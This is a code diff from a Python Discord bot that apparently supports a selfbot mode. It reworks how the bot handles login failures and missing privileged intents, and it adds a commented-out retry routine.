 _ProactorBasePipeTransport.__del__ = silence_event_loop_closed(_ProactorBasePipeTransport.__del__)
 
+# PrivilegedIntents fixed fail :')
+
+# async def login():
+#     global client
+#     try:
+#         await client.start(settings['token'], bot=not is_selfbot)
+#     except discord.PrivilegedIntentsRequired:
+#         print('PrivilegedIntentsRequired: This field is required to request for a list of members in the discord server that the bot is connected to. Watch https://youtu.be/DXnEFoHwL1A?t=44 to see how to turn on the required field.')
+#         # exit()
+#         client._connection = client._get_state(
+#                                 intents=client.intents.default()
+#                                 ) # reset intents to default
+#         input('lol')
+#         await login()
+#     except Exception as e:
+#         print(e)
+#     finally:
+#         sys.stdout.write('Exiting...               \n')
+
+# asyncio.run(login()) # if login failed because of the privileged intents then ask if user wants to turn off the intents
+
 try:
-    client.run(token, bot=not is_selfbot)
-# except discord.LoginFailure:
-#     print('Invalid token is being used.')
-#     exit()
+    client.run(settings['token'], bot=not is_selfbot)
 except discord.PrivilegedIntentsRequired:
     print('PrivilegedIntentsRequired: This field is required to request for a list of members in the discord server that the bot is connected to. Watch https://youtu.be/DXnEFoHwL1A?t=44 to see how to turn on the required field.')
+    exit()
+except Exception as e:
+    print(e)
 finally:
-    print('Exiting...')
+    sys.stdout.write('Exiting...               \n')
